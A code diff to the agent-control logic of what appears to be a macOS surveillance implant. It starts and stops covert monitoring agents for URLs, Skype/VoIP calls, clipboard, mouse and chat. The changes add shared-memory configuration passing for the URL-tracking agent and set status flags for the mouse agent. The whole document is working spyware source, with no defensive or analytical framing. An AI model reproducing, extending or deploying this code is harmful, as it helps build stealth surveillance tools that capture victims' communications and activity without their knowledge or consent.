@@ -736,36 +736,62 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command = AG_START;
             
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Creating URL Agent log file");
-#endif
-            BOOL success = [_logManager createLog: AGENT_URL
-                                      agentHeader: nil
-                                        withLogID: 0];
+            NSMutableData *urlConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
+            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
+                
+            shMemoryLog *_urlConfig     = (shMemoryLog *)[urlConfig bytes];
+            _urlConfig->status          = SHMEM_WRITTEN;
+            _urlConfig->agentID         = AGENT_URL;
+            _urlConfig->direction       = D_TO_AGENT;
+            _urlConfig->commandType     = CM_AGENT_CONF;
+            _urlConfig->commandDataSize = [agentConf length];
             
-            if (success == TRUE)
+            memcpy(_urlConfig->commandData,
+                   [agentConf bytes],
+                   [agentConf length]);
+            
+            if ([gSharedMemoryLogging writeMemory: urlConfig
+                                           offset: 0
+                                    fromComponent: COMP_CORE] == TRUE)
               {
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_URL
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-                    [agentConfiguration setObject: AGENT_RUNNING
-                                           forKey: @"status"];
-                    
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Start command sent to Agent URL", agentID);
+                infoLog(@"Starting Agent URL");
 #endif
-                  }
-                else
+
+                BOOL success = [_logManager createLog: AGENT_URL
+                                          agentHeader: nil
+                                            withLogID: 0];
+
+                if (success == TRUE)
                   {
+                    if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                   offset: OFFT_URL
+                                            fromComponent: COMP_CORE] == TRUE)
+                      {
+                        [agentConfiguration setObject: AGENT_RUNNING
+                                               forKey: @"status"];
+
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"An error occurred while starting agent URL");
+                        infoLog(@"Start command sent to Agent URL", agentID);
 #endif
-                    
-                    [agentCommand release];
-                    [agentConfiguration release];
-                    return NO;
+                      }
+                    else
+                      {
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"An error occurred while starting agent URL");
+#endif
+
+                        [agentCommand release];
+                        [agentConfiguration release];
+                        return NO;
+                      }
                   }
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Error while sending configuration to Agent URL");
+#endif
               }
           }
         break;
@@ -774,48 +800,48 @@ static NSLock *gSyncLock                  = nil;
       {
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
+
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
             [agentConfiguration objectForKey: @"status"] != AGENT_START)
-        {
-          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-          shMemoryHeader->agentID   = agentID;
-          shMemoryHeader->direction = D_TO_AGENT;
-          shMemoryHeader->command   = AG_START;
-          
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Creating APPLICATION Agent log file");
-#endif
-          BOOL success = [_logManager createLog: AGENT_APPLICATION
-                                    agentHeader: nil
-                                      withLogID: 0];
-          
-          if (success == TRUE)
           {
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID   = agentID;
+            shMemoryHeader->direction = D_TO_AGENT;
+            shMemoryHeader->command   = AG_START;
+
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Starting Agent Application");
+            infoLog(@"Creating APPLICATION Agent log file");
 #endif
-            if ([gSharedMemoryCommand writeMemory: agentCommand
-                                           offset: OFFT_APPLICATION
-                                    fromComponent: COMP_CORE] == TRUE)
-            {
-              [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
+            BOOL success = [_logManager createLog: AGENT_APPLICATION
+                                      agentHeader: nil
+                                        withLogID: 0];
+
+            if (success == TRUE)
+              {
 #ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Start command sent to Agent Application", agentID);
+                infoLog(@"Starting Agent Application");
 #endif
-            }
-            else
-            {
+                if ([gSharedMemoryCommand writeMemory: agentCommand
+                                               offset: OFFT_APPLICATION
+                                        fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
 #ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Error while sending start command to the agent");
+                    infoLog(@"Start command sent to Agent Application", agentID);
 #endif
-              
-              [agentCommand release];
-              [agentConfiguration release];
-              return NO;
-            }
+                  }
+                else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Error while sending start command to the agent");
+#endif
+
+                    [agentCommand release];
+                    [agentConfiguration release];
+                    return NO;
+                  }
+              }
           }
-        }
         break;
       }
     case AGENT_MOUSE:
@@ -835,6 +861,7 @@ static NSLock *gSyncLock                  = nil;
             NSData *agentConf = [agentConfiguration objectForKey: @"data"];
                 
             shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
+            _mouseConfig->status          = SHMEM_WRITTEN;
             _mouseConfig->agentID         = AGENT_MOUSE;
             _mouseConfig->direction       = D_TO_AGENT;
             _mouseConfig->commandType     = CM_AGENT_CONF;
@@ -851,7 +878,6 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Mouse");
 #endif
-                
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_MOUSE
                                         fromComponent: COMP_CORE] == TRUE)
@@ -934,6 +960,7 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->agentID         = agentID;
             shMemoryHeader->direction       = D_TO_AGENT;
             shMemoryHeader->command         = AG_START;
+
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Creating CLIPBOARD Agent log file");
 #endif
@@ -967,7 +994,7 @@ static NSLock *gSyncLock                  = nil;
               }
           }
         break;
-      }    
+      }
     case AGENT_VOIP:
       {
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -987,18 +1014,18 @@ static NSLock *gSyncLock                  = nil;
             
             voipStruct *voipConfiguration = (voipStruct *)[agentConf bytes];
             gSkypeQuality                 = voipConfiguration->compression;
-            
+
             shMemoryLog *_voipConfig     = (shMemoryLog *)[voipConfig bytes];
             _voipConfig->status          = SHMEM_WRITTEN;
             _voipConfig->agentID         = AGENT_VOIP;
             _voipConfig->direction       = D_TO_AGENT;
             _voipConfig->commandType     = CM_AGENT_CONF;
             _voipConfig->commandDataSize = [agentConf length];
-            
+
             memcpy(_voipConfig->commandData,
                    [agentConf bytes],
                    [agentConf length]);
-            
+
             if ([gSharedMemoryLogging writeMemory: voipConfig
                                            offset: 0
                                     fromComponent: COMP_CORE] == TRUE)
@@ -1006,7 +1033,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Voip - conf sent");
 #endif
-                
+
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_VOIP
                                         fromComponent: COMP_CORE] == TRUE)
@@ -1083,7 +1110,7 @@ static NSLock *gSyncLock                  = nil;
         if (agentConfiguration != nil)
           {
             if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-             && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
               {
                 [agentConfiguration setObject: AGENT_START forKey: @"status"];
                 [agentDevice setAgentConfiguration: agentConfiguration];
@@ -1392,9 +1419,6 @@ static NSLock *gSyncLock                  = nil;
 
             return NO;
           }
-        
-        // XXX: Close log??
-        
         break;
       }
     case AGENT_URL:
@@ -1605,19 +1629,19 @@ static NSLock *gSyncLock                  = nil;
         infoLog(@"Stopping Agent Device");
 #endif
         RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
-        
+
         if ([agentDevice stop] == FALSE)
-        {
+          {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Error while stopping agent agentDevice");
+            infoLog(@"Error while stopping agent agentDevice");
 #endif
-          return NO;
-        }
+            return NO;
+          }
         else
-        {
-          agentConfiguration = [self getConfigForAgent: agentID];
-          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-        }
+          {
+            agentConfiguration = [self getConfigForAgent: agentID];
+            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          }
         break;
       }
     default:
@@ -1783,7 +1807,7 @@ static NSLock *gSyncLock                  = nil;
 #endif
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
-                
+
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
@@ -1798,33 +1822,61 @@ static NSLock *gSyncLock                  = nil;
                     shMemoryHeader->agentID         = agentID;
                     shMemoryHeader->direction       = D_TO_AGENT;
                     shMemoryHeader->command         = AG_START;
-                    
+
+                    NSMutableData *urlConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
+
+                    shMemoryLog *_urlConfig     = (shMemoryLog *)[urlConfig bytes];
+                    _urlConfig->status          = SHMEM_WRITTEN;
+                    _urlConfig->agentID         = AGENT_URL;
+                    _urlConfig->direction       = D_TO_AGENT;
+                    _urlConfig->commandType     = CM_AGENT_CONF;
+                    _urlConfig->commandDataSize = [agentConfiguration length];
+
+                    memcpy(_urlConfig->commandData,
+                           [agentConfiguration bytes],
+                           [agentConfiguration length]);
+
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Creating URL Agent log file");
+                    infoLog(@"Sending configuration to agent URL");
 #endif
-                    BOOL success = [_logManager createLog: AGENT_URL
-                                              agentHeader: nil
-                                                withLogID: 0];
-                    
-                    if (success == TRUE)
+
+                    if ([gSharedMemoryLogging writeMemory: urlConfig
+                                                   offset: 0
+                                            fromComponent: COMP_CORE] == TRUE)
                       {
-                        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                                       offset: OFFT_URL
-                                                fromComponent: COMP_CORE] == TRUE)
-                          {
-                            [anObject setObject: AGENT_RUNNING
-                                                   forKey: @"status"];
-                            
 #ifdef DEBUG_TASK_MANAGER
-                            infoLog(@"Start command sent to Agent URL");
+                        infoLog(@"Starting Agent URL");
 #endif
-                          }
-                        else
+                        BOOL success = [_logManager createLog: AGENT_URL
+                                                  agentHeader: nil
+                                                    withLogID: 0];
+
+                        if (success == TRUE)
                           {
+                            if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                           offset: OFFT_URL
+                                                    fromComponent: COMP_CORE] == TRUE)
+                              {
+                                [anObject setObject: AGENT_RUNNING
+                                             forKey: @"status"];
+
 #ifdef DEBUG_TASK_MANAGER
-                            infoLog(@"An error occurred while starting agent URL");
+                                infoLog(@"Start command sent to Agent URL");
 #endif
+                              }
+                            else
+                              {
+#ifdef DEBUG_TASK_MANAGER
+                                infoLog(@"An error occurred while starting agent URL");
+#endif
+                              }
                           }
+                      }
+                    else
+                      {
+#ifdef DEBUG_TASK_MANAGER
+                        errorLog(@"Error while sending configuration to Agent URL");
+#endif
                       }
                   }
                 
@@ -1894,6 +1946,7 @@ static NSLock *gSyncLock                  = nil;
                     NSMutableData *mouseConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                     
                     shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
+                    _mouseConfig->status          = SHMEM_WRITTEN;
                     _mouseConfig->agentID         = AGENT_MOUSE;
                     _mouseConfig->direction       = D_TO_AGENT;
                     _mouseConfig->commandType     = CM_AGENT_CONF;
@@ -1923,7 +1976,6 @@ static NSLock *gSyncLock                  = nil;
                           }
                       }
                   }
-                
                 break;
               }
             case AGENT_CHAT:
